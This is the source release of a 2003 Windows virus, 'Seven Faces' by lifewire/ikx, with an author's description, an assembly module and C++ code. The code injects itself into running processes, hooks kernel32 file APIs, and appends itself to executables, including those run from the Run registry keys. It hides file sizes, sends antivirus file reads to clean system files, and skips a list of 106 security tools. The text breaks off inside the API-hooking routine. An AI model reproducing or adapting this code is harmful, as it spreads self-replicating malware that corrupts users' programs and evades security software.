
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[DESC.TXT]컴�

    seven faces by lifewire/ikx                                februari 2003


    about 5000 bytes nt5 'resident' 'stealth' infector. 5% asm, 95% c++

    i would like to show how nice c++ is for viral usage. some people consider
    hll (so also c++) as lame but i think it is quite useful for viral usage.
    and not only for pre-/appenders! it is maybe a few bytes larger
    then needed, but do you care in these days? coding this toy took me about
    a few weeks, in asm it would have taken much longer i guess.

    the by bcc generated assembler source (which is very readable) can be
    optimized to cut some bytes. 

    i would like to use this space to thank some people: T-2000, my ikx mates,
    ratter, rajaat, gigabyte. for being my friend, for inspiration and ideas.

    i guess this is the last vx-thing i release, so ehm... bye!

    if you have something to tell me, contact me at lifewire@mail.ru


    description:

    loading

    on startup it enumerates the accessable processes. a already-running-check
    is done, and if not true, remote memory will be allocated and a thread is
    spawned. this thread will first mark the process as 'already done'. then
    some checks on the module filename are done: the name avp32 will enable
    the av_stealth feature. one of the names 'explorer, cmd, acdsee32, winrar
    or wincmd' will enable the file stealth feature. doing filestealth is not
    always good for all applications (for example winzip), so i chose for the
    'chosen few' stealth. after hooking the thread will check some registery
    key's for (exe) files runned at startup to ensure a safe place in the
    system.

    hooking

    after the stealth flags are determined, it will hook the following apis:
    CreateFileW,FindFirstChangeNotificationW, FindFirstFileExW and
    FindNextFileW. the first one is for general infection and under nt5
    CreateFileA will call CreateFileW so both are captured. hooking is done
    by overwriting the original api handling code inside the exporting module
    with a jmp to a hook handler inside the virus body. the original code is
    copied inside some by-virus allocated memory and is aligned on opcode size.
    so if an application calls a hooked api, it will follow this flow:
    1. call [address] 2. address: jmp virushook: 3. process hook by virus
    4. execute the few original opcodes which were originally on 'address'
    5. jmp to after the overwritten bytes on address+x. for this a small
    disassembler is used.

    hook handling: size stealth

    by hooking FindFirstChangeNotificationW i avoid the refreshing of a
    directory after a infection is avoided. the other two are simply for size
    stealth - if enabled.

    hook handling: av stealth

    createfilew is hooked, and used by avp32. first scanning will cause a
    mass infection, second i will avp32 not access infected files. i will let
    it open a random file in the %system% directory and avp doesn't care.

    hook handling: infecting

    the standard stuff. infection marker is based on filetimes. there are 2
    markers: processed and infected. processed exists for speed optimizing,
    since i intercept really many files.

    compiling

    should be done with bcc32, version 5. (bcc 6 bitches about inline asm and
    it creates a larger binary with the same compiler flags)

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[DESC.TXT]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAIN.ASM]컴�
.386
.model flat,STDCALL
locals __
include inc\asm.inc
.data
bla db ?

.code

;exported data
public _crcs
public _blacklist
public _org9entry
public _hostentryrva
public _startupregkey

;exported functions
public @getk32base
public @crc32
public @memcpy
public @poordasm
public @hookentry

;called functions
extern @finddatastealth:proc;
extern @import:proc;
extern @makeresident:proc;
extern @hookhandler:proc;
extern @changeprot:proc;

;----------------------------------------------------------------------------;
main:           int     3
                push    eax                     ;reserve a ret add
                pushad
                mov     ebp,esp
                add     esp,-200h

                call    __next
__next:         pop     edi
                sub     edi,(offset __next-main);

                lea     ebx,[ebp-200h]

                call    @getk32base

                lea     edx,[edi+(_crcs-main)]  ;int* crcs
                mov     ecx,ebx                 ;int* imports
                ;void __fastcall import(int base, int* crcs, int* imports)
                call    @import

                call    [ebp-200h+(getversion__-apilist__)]
                or      eax,eax                 ;is NT?
                js      __restorehost
                cmp     al,5                    ;is NT5?
                jne     __restorehost

                mov     eax,ebx                 ;api*
                mov     edx,edi                 ;void* viralimagebaes
                ;void __fastcall makeresident(api* a, void* vimbase)
                call    @makeresident

__restorehost:  call    __z

_org9entry      db      0e8h,6bh,04ch,0a7h,77h
                db      4 dup (0c3h)

__z:            pop     esi

                mov     edi,offset _org9entry
  _hostentryrva equ $-4

                mov     eax,ebx                 ;api*a
                mov     edx,edi                 ;address
                push    4                       ;page_readwrite
                pop     ecx
                ;int __fastcall changeprot(api* a,void* address,int flags)
                call    @changeprot

                mov     [ebp+20h],edi             ;return rva

                push    9
                pop     ecx
        rep     movsb

                mov     esp,ebp
                popad
                ret
;----------------------------------------------------------------------------;




;----------------------------------------------------------------------------;
_crcs:          dd 0

apilist__:      crc32m  <CreateFileW>
                crc32m  <FindFirstChangeNotificationW>
                crc32m  <FindFirstFileExW>
                crc32m  <FindNextFileW>
getversion__:   crc32m  <GetVersion>
                crc32m  <LoadLibraryA>
                crc32m  <GetProcAddress>
                crc32m  <CreateFileMappingW>
                crc32m  <MapViewOfFile>
                crc32m  <CloseHandle>
                crc32m  <UnmapViewOfFile>
                crc32m  <VirtualAllocEx>
                crc32m  <VirtualFree>
                crc32m  <VirtualProtect>
                crc32m  <VirtualQuery>
                crc32m  <OpenProcess>
                crc32m  <ReadProcessMemory>
                crc32m  <WriteProcessMemory>
                crc32m  <CreateRemoteThread>
                crc32m  <GetModuleHandleA>
                crc32m  <GetLastError>
                crc32m  <SetLastError>
                crc32m  <FindFirstFileW>
                crc32m  <FindClose>
                crc32m  <FileTimeToSystemTime>
                crc32m  <SystemTimeToFileTime>
                crc32m  <GetFileSize>
                crc32m  <WideCharToMultiByte>
                crc32m  <SetFilePointer>
                crc32m  <SetEndOfFile>
                crc32m  <SetFileTime>
                crc32m  <GetFileTime>
                crc32m  <Sleep>
                crc32m  <GetModuleFileNameA>
                crc32m  <GetSystemDirectoryW>
                crc32m  <GetTickCount>
                crc32m  <GetFullPathNameW>
                crc32m  <lstrlenW>
                crc32m  <IsBadWritePtr>
                dd 0

                db      "user32",0,0
                crc32m  <CharUpperA>
                dd 0

                db      "psapi",0,0,0
                crc32m  <EnumProcesses>
                crc32m  <EnumProcessModules>
                dd 0

                db      "sfc",0,0,0,0,0
                crc32m  <SfcIsFileProtected>
                dd 0

                db      "advapi32",0            ;screws up alignment
                crc32m  <RegOpenKeyExA>
                crc32m  <RegEnumValueW>
                crc32m  <RegCloseKey>
                dd      0

                dd 0
;----------------------------------------------------------------------------;




;----------------------------------------------------------------------------;
@hookentry      proc
                mov     cl,0    ;createfilew
                jmp     __e
                mov     cl,1    ;findfirstchangenotificationw
                jmp     __e
                mov     cl,2    ;findfirstfileexw
                jmp     __e
                mov     cl,3    ;findnextfilew
__e:

                push    eax
                pushad

                call    __q
        __next:
                int     3
                mov     esp,[esp+8]
                jmp     hook_leave
        __q:    xor     edx,edx
                pop     eax
                push    eax
                push    dword ptr fs:[edx]
                mov     fs:[edx],esp

                sub     eax,(offset __next-main)    ;base

                movzx   ecx,cl

                push    ecx
                shl     ecx,4
                lea     edx,[ecx+eax+4000h-100h];return address of hookentry
                pop     ecx
                mov     [esp+28h],edx             ;points to hook-restorder

                cmp     cl,2
                je      hook_fff                    ;findfirstfileex
                cmp     cl,3
                je      hook_fnf                    ;findnextfile
                cmp     cl,1                        ;findfirstchange
                je      hook_ffc

                lea     edx,[esp+28h+4+4]           ;pointer to arg1
                push    edx
                mov     edx,[edx]                   ;arg1

                call    @hookhandler    ;hookhandler(base,arg1,number,&arg1)

hook_leave:     pop     dword ptr fs:[0]
                pop     eax

                popad
                ret
@hookentry      endp
;----------------------------------------------------------------------------;




;----------------------------------------------------------------------------;
hook_fff:       xchg    eax,edi

                cmp     dword ptr [esp+28h+4+(2*4)],0   ;FindExInfoStandard
                jne     hook_leave

                push    dword ptr [esp+28h+4+(6*4)]
                push    dword ptr [esp+28h+4+(6*4)]
                push    dword ptr [esp+28h+4+(6*4)]
                mov     ebx,dword ptr [esp+28h+4+(6*4)]
                push    ebx
                push    dword ptr [esp+28h+4+(6*4)]
                push    dword ptr [esp+28h+4+(6*4)]
                call    edx
                mov     [esp+8+pushad_eax],eax

                inc     eax
                jz      __s

                xchg    eax,edi                         ;base
                mov     edx,ebx                         ;wfd
                call    @finddatastealth

            __s:pop     dword ptr fs:[0]
                pop     eax
                popad
                pop     ecx ;discard ret add of hook
                ret     6*4
;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
hook_fnf:       xchg    eax,edi

                mov     ebx,dword ptr [esp+28h+4+(2*4)]     ;info
                push    ebx
                push    dword ptr [esp+28h+4+(2*4)]         ;filename
                call    edx
                mov     [esp+8+pushad_eax],eax

                or      eax,eax
                jz      __f

                xchg    eax,edi
                mov     edx,ebx
                call    @finddatastealth

            __f:pop     dword ptr fs:[0]
                pop     eax
                popad
                pop     ecx ;discard ret add of hook
                ret     2*4
;----------------------------------------------------------------------------;


_startupregkey  db "Software\Microsoft\Windows\CurrentVersion\Run",0


;----------------------------------------------------------------------------;
;findfirstchangenotification is handled in asm
hook_ffc:       

                and     dword ptr [esp+28h+4+12],\
                        not(FILE_NOTIFY_CHANGE_LAST_WRITE\
                           +FILE_NOTIFY_CHANGE_SIZE\
                           +FILE_NOTIFY_CHANGE_ATTRIBUTES)
                jnz     __q

                ;if no monitorflags are left after our and'ing, add this
                ;parameter, else the function fails i guess

                inc     dword ptr [esp+28h+4+12];FILE_NOTIFY_CHANGE_FILE_NAME

__q:            

                jmp     hook_leave
;----------------------------------------------------------------------------;




;----------------------------------------------------------------------------;
;int getk32base(void);
@getk32base     proc

                xor     eax,eax
                mov     edx,fs:[eax]                    ;get pointer into k32
                inc     edx
__x:            mov     ecx,[edx+3]                     ;
                mov     edx,[edx-1]
                inc     edx                             ;get last se handler
                jnz     __x

                mov     edx,"EP"
                xor     cx,cx                           ;64k alignment
__z:            movzx   eax,word ptr [ecx+03ch]
                cmp     dword ptr [ecx+eax],edx
                je      __y                             
                sub     ecx,10000h
                jmp     __z
__y:            xchg    eax,ecx
                ret

@getk32base     endp
;----------------------------------------------------------------------------;


db "- SEVEN FACES - IKX -"


;----------------------------------------------------------------------------;
;void __fastcall memcpy(void* dst,void* src,int size);
@memcpy:        push    esi
                push    edi
                xchg    edi,eax
                mov     esi,edx
        rep     movsb
                pop     edi
                pop     esi
                ret
;----------------------------------------------------------------------------;




;----------------------------------------------------------------------------;
;thanks to some av description (106 entries)
_blacklist:
crc32m <ZONEALARM.EXE>
crc32m <YAPS.EXE>
crc32m <WFINDV32.EXE>
crc32m <WEBSCANX.EXE>
crc32m <VSSTAT.EXE>
crc32m <VSHWIN32.EXE>
crc32m <VSECOMR.EXE>
crc32m <VSCAN40.EXE>
crc32m <VETTRAY.EXE>
crc32m <VET95.EXE>
crc32m <TDS2-NT.EXE>
crc32m <TDS2-98.EXE>
crc32m <TCA.EXE>
crc32m <TBSCAN.EXE>
crc32m <SWEEP95.EXE>
crc32m <SPHINX.EXE>
crc32m <SMC.EXE>
crc32m <SERV95.EXE>
crc32m <SCRSCAN.EXE>
crc32m <SCANPM.EXE>
crc32m <SCAN95.EXE>
crc32m <SCAN32.EXE>
crc32m <SAFEWEB.EXE>
crc32m <RESCUE.EXE>
crc32m <RAV7WIN.EXE>
crc32m <RAV7.EXE>
crc32m <PERSFW.EXE>
crc32m <PCFWALLICON.EXE>
crc32m <PCCWIN98.EXE>
crc32m <PAVW.EXE>
crc32m <PAVSCHED.EXE>
crc32m <PAVCL.EXE>
crc32m <PADMIN.EXE>
crc32m <OUTPOST.EXE>
crc32m <NVC95.EXE>
crc32m <NUPGRADE.EXE>
crc32m <NORMIST.EXE>
crc32m <NMAIN.EXE>
crc32m <NISUM.EXE>
crc32m <NAVWNT.EXE>
crc32m <NAVW32.EXE>
crc32m <NAVNT.EXE>
crc32m <NAVLU32.EXE>
crc32m <NAVAPW32.EXE>
crc32m <N32SCANW.EXE>
crc32m <MPFTRAY.EXE>
crc32m <MOOLIVE.EXE>
crc32m <LUALL.EXE>
crc32m <LOOKOUT.EXE>
crc32m <LOCKDOWN2000.EXE>
crc32m <JEDI.EXE>
crc32m <IOMON98.EXE>
crc32m <IFACE.EXE>
crc32m <ICSUPPNT.EXE>
crc32m <ICSUPP95.EXE>
crc32m <ICMON.EXE>
crc32m <ICLOADNT.EXE>
crc32m <ICLOAD95.EXE>
crc32m <IBMAVSP.EXE>
crc32m <IBMASN.EXE>
crc32m <IAMSERV.EXE>
crc32m <IAMAPP.EXE>
crc32m <FRW.EXE>
crc32m <FPROT.EXE>
crc32m <FP-WIN.EXE>
crc32m <FINDVIRU.EXE>
crc32m <F-STOPW.EXE>
crc32m <F-PROT95.EXE>
crc32m <F-PROT.EXE>
crc32m <F-AGNT95.EXE>
crc32m <ESPWATCH.EXE>
crc32m <ESAFE.EXE>
crc32m <ECENGINE.EXE>
crc32m <DVP95_0.EXE>
crc32m <DVP95.EXE>
crc32m <CLEANER3.EXE>
crc32m <CLEANER.EXE>
crc32m <CLAW95CF.EXE>
crc32m <CLAW95.EXE>
crc32m <CFINET32.EXE>
crc32m <CFINET.EXE>
crc32m <CFIAUDIT.EXE>
crc32m <CFIADMIN.EXE>
crc32m <BLACKICE.EXE>
crc32m <BLACKD.EXE>
crc32m <AVWUPD32.EXE>
crc32m <AVWIN95.EXE>
crc32m <AVSCHED32.EXE>
crc32m <AVPUPD.EXE>
crc32m <AVPTC32.EXE>
crc32m <AVPM.EXE>
crc32m <AVPDOS32.EXE>
crc32m <AVPCC.EXE>
crc32m <AVP32.EXE>
crc32m <AVP.EXE>
crc32m <AVNT.EXE>
crc32m <AVKSERV.EXE>
crc32m <AVGCTRL.EXE>
crc32m <AVE32.EXE>
crc32m <AVCONSOL.EXE>
crc32m <AUTODOWN.EXE>
crc32m <APVXDWIN.EXE>
crc32m <ANTI-TROJAN.EXE>
crc32m <ACKWIN32.EXE>
crc32m <_AVPM.EXE>
crc32m <_AVPCC.EXE>
crc32m <written by lifewire/ikx, with love from holland>
;----------------------------------------------------------------------------;




;----------------------------------------------------------------------------;
;poor disassembler. whatever, it aint a real disassembler anyway :)
;used for api hooking to retrieve the first n bytes (n should be >= 5)
;int __fastcall poordasm(void* code)
@poordasm:      push    esi
                xchg    esi,eax
                xor     ecx,ecx
                lodsd
                
                cmp     al,8bh
                jne     __1
                cmp     ah,0ech 
                je      pd_2    ;mov ebp,esp
            __1:
                cmp     al,0ffh
                jne     __2
                cmp     ah,75h  ;push dwo[ebp+imm8]
                je      pd_3

           __2:
;               ;not smart to copy relative calls :)
;                cmp     al,0e8h
;                je      pd_5    ;call

                cmp     al,33h
                jne     __3
                cmp     al,0c0h
                jae     pd_2    ;xor reg,mem / xor reg,reg

           __3:

                cmp     al,83h
                jne     __4
                cmp     ah,0ech
                je      pd_3

          __4:

                cmp     al,2bh
                jne     __5

                cmp     ah,0c0h
                jae     pd_2    ;sub reg,reg

          __5:

                cmp     al,06ah
                je      pd_2    ;push imm8

                cmp     al,68h
                je      pd_5    ;push imm32

                cmp     al,81h
                jne     __6
                cmp     ah,0ech ;sub esp,imm32 - used in findfirstfileexw
                je      pd_6

          __6:

                and     al,11110000b
                cmp     al,50h
                je      pd_1    ;push or pop reg

                jmp     pd_0

        pd_6:   inc     ecx
        pd_5:   inc     ecx
                inc     ecx
        pd_3:   inc     ecx
        pd_2:   inc     ecx
        pd_1:   inc     ecx

        pd_0:   pop     esi
                xchg    eax,ecx
                ret
;----------------------------------------------------------------------------;




;----------------------------------------------------------------------------;
;int __fastcall crc32(char*);
@crc32          proc
                push    esi
                xchg    eax,esi
                mov     edx,mCRC32_init
        gCRC32_next_byte:
                lodsb
                or      al,al           ;end of name ?
                jz      gCRC32_finish

                xor     dl,al
                mov     al,08h
        gCRC32_next_bit:
                shr     edx,01h
                jnc     gCRC32_no_change
                xor     edx,mCRC32
        gCRC32_no_change:
                dec al
                jnz     gCRC32_next_bit
                jmp     gCRC32_next_byte
        gCRC32_finish:
                xchg    eax,edx         ;CRC32 to EAX
                pop     esi
                ret

@crc32          endp
;----------------------------------------------------------------------------;


end main
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAIN.ASM]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[BODY.CPP]컴�
//#define MAGICPID  1848    //for testing

#define TESTVALUECHANGEME   666 //please change the code where i am used
//TESTVALUGECHANGEME is a hardcoded id. it should be better to use a machine
//dependent (crc32 of computername or whatever) id.

#define VIRTUALSIZE         0x4000
#define VIRTUALCODESIZE     0x3000
#define RAWSIZEALIGN        0x2000

#include "inc\cpp.hpp"

//todo: cd protection, network, anti av monitor

extern "C" {

/* stealths with finddata's intercepted from the two find-api hooks */
void __fastcall finddatastealth(void* base,WIN32_FIND_DATA* wfd)
{
    hookglob* hg=(hookglob*)((int)base+VIRTUALCODESIZE);
    api* a=(api*)&hg->a;

    if (!(hg->flags&STEALTH_SIZE)) return;

    if (wfd->dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) return;

    //quick check filetime. 0=not processed, 1=infected, 2=processed,not infected
    if (isspecialfiletime(a,&wfd->ftLastWriteTime) != 1) return;

    //check if it was really infectable
    //if (!isgoodname(base,a,wfd->cFileName)) return;

    //and finally stealth
//    wfd->nFileSizeLow-=RAWSIZEALIGN;
    wfd->nFileSizeLow=123;//RAWSIZEALIGN;
}




/* infects filename (the largest and least optimized routine from this app) */   
int __fastcall infect(api* a,char* filename, void* base)
{
    FILEIO f;
    MZ_HEADER* mz;
    PE_HEADER* pe;

    int iswzip=0;

    asm int 3

    mz=(MZ_HEADER*)openfile(a,&f,filename,RAWSIZEALIGN);

    if (!mz) return 0;
/* 
 ..."If the word value at offset 18h is 40h or greater, the word value at 3Ch
 is typically an offset to a Windows header. Applications must verify this for
 each executable-file header being tested, because a few applications have
 a different header style."...                                              */

    double cloak=(double)IMAGE_DOS_SIGNATURE;

    //avoid strange files

    if ((double)mz->mz_id!=cloak) goto x;   //cloaked MZ sign
    if (mz->mz_relofs<0x40) goto x;
    if (mz->mz_neptr > f.size) goto x;

    pe=(PE_HEADER*)(((MZ_HEADER*)mz)->mz_neptr+(int)mz);

    cloak=(double)IMAGE_NT_SIGNATURE;       //cloaked PE sign

    if ((double)pe->pe_id!=cloak ||
        pe->pe_objectalign!=0x1000 ||
        pe->pe_cputype!=IMAGE_FILE_MACHINE_I386 ||
        pe->pe_securityrva!=0) goto x;

    if (!(pe->pe_flags&IMAGE_FILE_32BIT_MACHINE) ||
        !(pe->pe_flags&IMAGE_FILE_EXECUTABLE_IMAGE) ||
         (pe->pe_flags&IMAGE_FILE_DLL)) goto x;

    if (pe->pe_ntheadersize==224)
    {
        PE_OBJENTRY_STRUCT* pos=(PE_OBJENTRY_STRUCT*)((int)pe+sizeof(PE_HEADER));

        if (pos[0].oe_objectflags&IMAGE_SCN_MEM_WRITE ||
            pos[pe->pe_numofobjects].oe_objectflags&IMAGE_SCN_MEM_WRITE)
          goto x;

        int maxraw=0;
        int maxi;

        for (int i=0;i<pe->pe_numofobjects;i++)
        {
            if (crc32(pos[i].oe_name)==0xa66d28e3)  //is _winzip_ ?
              iswzip++;

            if (pos[i].oe_physoffs>maxraw)  //if highest raw, remember 'm
            {
                maxraw=pos[i].oe_physoffs;
                maxi=i;
            }
        }

        if (maxraw+pos[maxi].oe_physsize < f.size)
          goto x;  //overlays?

        int bestsize=pos[maxi].oe_physsize;
        maxraw+=bestsize;

        pos[maxi].oe_physsize+=RAWSIZEALIGN;
        pos[maxi].oe_virtsize+=RAWSIZEALIGN;
        pe->pe_imagesize+=RAWSIZEALIGN;

        if (pos[maxi].oe_virtsize < pos[maxi].oe_physsize)
          pos[maxi].oe_virtsize=pos[maxi].oe_physsize;

        int entryraw=rva2raw(mz,pe,pe->pe_entrypointrva);

        if (entryraw==0) goto x;

        *(int*)((int)&hostentryrva+(int)base-0x401000)=pe->pe_entrypointrva+pe->pe_imagebase;

        //backup some bytes from host's entrypoint
        memcpy((void*)((int)base+(int)&org9entry-0x401000),(void*)entryraw,9);

        //copy virus
        memcpy((void*)((int)maxraw+(int)mz),base,RAWSIZEALIGN);

        //patch host's entrypoint
        *(char*)entryraw=0xb8;                   //mov eax,
        *(int*)((char*)entryraw+1)=-(bestsize+pos[maxi].oe_virtrva+pe->pe_imagebase);
        *(int*)((char*)entryraw+5)=0xc350d8f7;  //-neg eax- -push eax- -ret-

        //if wzip sfx, kill crc32
        if (iswzip)
        {
            for (int i=0;i<f.size;i++)
            {
                if ( ((char*)mz)[i]==0x4e)     //start of wzip header NMC blabla
                {
                    int sum=0;
                    for (int w=0;w<8;w++)
                    {
                        sum+=((unsigned char*)mz)[i+w];
                        sum=sum<<1;
                    }
                    if (sum==0x91a4)        //should be the sum :)

                    *(int*)&(((char*)mz)[i+8])=0;
                }
            }
        }
    }
    
    closefile(a,&f,0);  //dont restore filesize
    return 1;

x:

    closefile(a,&f,1);  //restore filesize
    return 0;
}




/* rva2raw */
int __fastcall rva2raw(MZ_HEADER* mz,PE_HEADER* pe,int rva)
{
    PE_OBJENTRY_STRUCT* pos=(PE_OBJENTRY_STRUCT*)((int)pe+sizeof(PE_HEADER));

    for (int i=0;i<pe->pe_numofobjects;i++)
    {
        if (rva>pos[i].oe_virtrva&&rva<(pos[i].oe_virtrva+pos[i].oe_virtsize))
            return rva-pos[i].oe_virtrva+pos[i].oe_physoffs+(int)mz;
    }
    return 0;
}




/* checks for .exe, .scr and a list of av names */
int __fastcall isgoodname(void* base,api* a, char* filename)
{
    char buffer[MAX_PATH];

    int blen=a->WideCharToMultiByte(0,0,filename,-1,buffer,sizeof(buffer),0,0);

    if (blen==0) return 0;

    a->CharUpperA(buffer);

    //C..BLAA
    if (buffer[0]!='C' ||
        buffer[3]!='B' ||
        buffer[4]!='L' ||
        buffer[5]!='A' ||
        buffer[6]!='A') return 0;

    int i;

    for (i=blen;buffer[i]!='.';i--)
    {
        if (i==0) return 0;
    }

    int dext=*(int*)(&buffer[i]);

    if (dext!='.EXE' && dext!='.SCR') return 0; //HLL coders & little-endian?

    int crc=crc32(buffer);

    for (int c=0;c<106;c++)
    {
        if (crc==((int*)((int)base+(int)&blacklist-0x401000))[c]) return 0;
    }


    return 1;
}



/* returns 1 if infected, 2 if processed but not infected */
int __fastcall isspecialfiletime(api* a,FILETIME* filetime)
{
    SYSTEMTIME systime;
    a->FileTimeToSystemTime(filetime,&systime);

    //infected?
    if (systime.wHour==(systime.wSecond*16021019)%24 && //1.602*10^-19
        systime.wMinute==(systime.wSecond*911031)%60) //9.1*10^-31
        return 1;

    //processed?
    if (systime.wHour==(systime.wSecond*314159)%24 &&
        systime.wMinute==(systime.wSecond*271828)%60) //pi & e
        return 2;

    return 0;
}

/* checks if filename is infected using findfirstfilew -> time
   returns 1 if infected, 2 if processed but not infected */
int __fastcall isinfected(api* a,char* filename)
{
    WIN32_FIND_DATA wfd;

    int r=0;

    HANDLE h;
    if (INVALID_HANDLE_VALUE!=(h=a->FindFirstFileW(filename,&wfd)))
    {
        r=isspecialfiletime(a,&wfd.ftLastWriteTime);

        a->FindClose(h);
    }
    
    return r;
}




/* main hook handler. is called by assembler intercepter  */
void __fastcall hookhandler(void* base,char* arg1,int hookn, char** arg1p)
{
    hookglob* hg=(hookglob*)((int)base+VIRTUALCODESIZE);
    api* a=(api*)&hg->a;

    if (arg1==0) return;

    int tick=a->GetTickCount(); //avoids api loop locks etc
    if (hg->inapi)
    {
        if (tick-hg->inapi < 666) return;   //666ms max
    }

    hg->inapi=tick;

    char filename[520]; //wide

    unsigned int n=a->lstrlenW(arg1)+1;
    if (n<260)
    {
        memcpy(filename,arg1,n*2);  //backup filename

        int isinf=isinfected(a,arg1); //1 = infected, 2 = processed
        if (!isinf && isgoodname(base,a,filename) && hookn==0)
        {
            isinf=infect(a,filename,base);
        }

        if (!a->IsBadWritePtr((void*)arg1,n*2))
            memcpy(arg1,filename,n*2);  //restore filename if possible

        //if hooking inside AVP32 then make it unable to access the real 
        //infected file
        if (hg->flags==STEALTH_AV && isinf==1)
        {
            asm int 3;
            *(int*)arg1p=(int)getrndfile(hg,a,hg->avbuffer);
        }
    }

    hg->inapi=0;

}




/* picks one of the 1000's of files in the win\system directory. this routine
   is used for av stealth (createfilew by an av of an infected file is re-
   directed to a clean file in the win\system dir */
char* __fastcall getrndfile(hookglob* hg,api* a, char* buf)
{
    int l=a->GetSystemDirectoryW(buf,260);
    if (l)
    {
        *(int*)&((short*)buf)[l]=0x2a005c;  //append wildcard
        ((short*)buf)[l+2]=0;

        WIN32_FIND_DATA wfd;

        HANDLE h=a->FindFirstFileW(buf,&wfd);

        if (h!=INVALID_HANDLE_VALUE)
        {
            unsigned int i=getrnd32(hg)%512;
            for (unsigned int s=0;;s++)
            {
                if(a->FindNextFileW(h,&wfd)==0)
                    break;

                if (s>=i &&
                    !(wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) &&
                    isspecialfiletime(a,&wfd.ftLastWriteTime)!=1)

                  break;
            }
            a->FindClose(h);
            memcpy(&((short*)buf)[l+1],wfd.cFileName,100);  //replace *
        }
        return buf;
    }
    else
    {
        return NULL;   //then make the createfilew at least fail...
    }
}




/* based on nothing then feeling, but appears to work fine :) */
unsigned int __fastcall getrnd32(hookglob* hg)
{
    hg->rnd32seed+=160219;
    hg->rnd32seed*=0x49d23711;
    return hg->rnd32seed;
}




/* remote created thread. base = absolute base */
void __stdcall winntloader(void* base)
{
    asm int 3;
    __seh_set

    void* k32base=(void*)getk32base();

    hookglob* hg=(hookglob*)((int)base+VIRTUALCODESIZE);
    api* a=(api*)&hg->a;

    import((int)k32base,(int*)((int)base+(int)&crcs-0x401000),(int*)a);

    void* hostbase=(void*)a->GetModuleHandleA(NULL);

    //give the current process our marker
    int oldprot;
    if (0!=(oldprot=changeprot(a,hostbase,PAGE_READWRITE)))
    {
        PE_HEADER* pe=(PE_HEADER*)(((MZ_HEADER*)hostbase)->mz_neptr+(int)hostbase);
        pe->pe_datetime=TESTVALUECHANGEME;
        a->VirtualProtect(hostbase,4096,oldprot,&oldprot);
    }

    hg->inapi=0;
    hg->flags=0;

    /* check the name of the module where we reside in. if it is one of mr.
       kaspersky's creations, then do a kind of file stealth hack (and also
       mass infect!)
       or if it is acdsee, explorer, cmd, winrar or wincommander, then enable
       filesizestealth. they are stealth compatible and a have a 100% award.
       (winzip for example isn't, but there are rumors it's creators are
       working hard on it to solve the problem) */

    char buffer[260];

    int l=a->GetModuleFileNameA(0,buffer,sizeof(buffer));
    a->CharUpperA(buffer);
    if(l)
    {
        for (int i=l;i>0;i--)
        {
            if (buffer[i]=='\\')
            {
                int crc=crc32(&buffer[i+1]);
                if (crc==0x2a20ddb)    //AVP32.EXE
                {
                    hg->flags=STEALTH_AV;
                }
                if (crc==0x68df08d3 ||
                    crc==0x302f9eef ||
                    crc==0xcdeea7f8 ||
                    crc==0xb27b3251 ||
                    crc==0x9e8f4fc0)                
                  hg->flags=STEALTH_SIZE; //acdsee,explorer,cmd,winrar,wincmd
            }
        }
    }
    
    /*
       now patch kernel32.dll's exports asuming that it is a valid module :)

       each api export is hooked by placing a jmp on its original code. this
       code is backed up at base+virtualsize-100+n*0x10 where n is the api #

    */
    for (int i=0;i<4;i++)   
    {
        if (hookapi(a,k32base,((int*)((int)base+(int)&crcs-0x401000+4))[i],(void*)((int)&hookentry+(int)base-0x401000+i*4),(char*)((int)base+(VIRTUALSIZE-0x100)+i*0x10)))
        {
            ((int*)a)[i]=(int)base+(VIRTUALSIZE-0x100)+i*0x10;//each hook has 0x10 backup space.
        }
    }


    hg->rnd32seed=a->GetTickCount()^l;  //init rnd32

    a->Sleep(getrnd32(hg)%16384);   //a delta delay

    doregistery(a,HKEY_CURRENT_USER,base); 
    doregistery(a,HKEY_LOCAL_MACHINE,base); 

    int procsum=getprocsum(a);

    for(;;)
    {
        a->Sleep(10*1000);
        if (procsum!=getprocsum(a))
        {
            if ((procsum=getprocsum(a))==0) break;  //test not needed
            makeresident(a,base);
        }
    }

    __seh_rem
}




// used to notice new processes.
int __fastcall getprocsum(api* a)
{
    int ppid[256];

    int n;
    if (!a->EnumProcesses(ppid,256,&n)) return 0;

    int sum=0;

    for (int i=0;i<(n>>2);i++)
        sum+=ppid[i];

    return sum;
}




// infects files started by registery to ensure a safe place in the system
void __fastcall doregistery(api* a,int key, void* base)
{
    int reghandle;

    if (a->RegOpenKeyExA(key,(char*)((int)&startupregkey-0x401000+(int)base),0,(void*)KEY_QUERY_VALUE,&reghandle)==ERROR_SUCCESS)
    {
        int index=0;
        for(;;index++)
        {
            char valuedata[520];
            char valuename[260];
            short* vdata=(short*)valuedata;
            int dsize=260;
            int nsize=130;
            int type;
            if (a->RegEnumValueW(reghandle,
                                 index,
                                 valuename,
                                 &nsize,
                                 0,
                                 &type,
                                 (char*)vdata,
                                 &dsize)!=ERROR_SUCCESS) break;

            //asdf

            if (vdata[0]=='"') vdata++;
            for(int i=1;i<dsize;i++)
            {
                if (vdata[i]=='"')
                {
                    vdata[i]=0;
                    break;
                }

            }

            if (isgoodname(base,a,(char*)vdata) && !isinfected(a,(char*)vdata))
                infect(a,(char*)vdata,base);

        }
        a->RegCloseKey(reghandle);
    }
}




/* hooks from module 'base' the exported api-name whose crc matches 'crc' and
   makes it point to 'fn' and backups at 'backup' */
int __fastcall hookapi(api* a,void* base, int crc, void* fn, char* backup)
{
    PE_EXPORT* exp = (PE_EXPORT*)((int)base+((PE_HEADER*)((int)base+((MZ_HEADER*)base)->mz_neptr))->pe_exportrva);
    char** nametbl = (char**)((int)base+exp->ex_namepointersrva);
    short* ordinaltbl = (short*)((int)base+exp->ex_ordinaltablerva);
    int* fntbl = (int*)((int)base+exp->ex_addresstablerva);

    int i;
    for (i=0;crc32(nametbl[i]+(int)base)!=crc;i++)
        ;

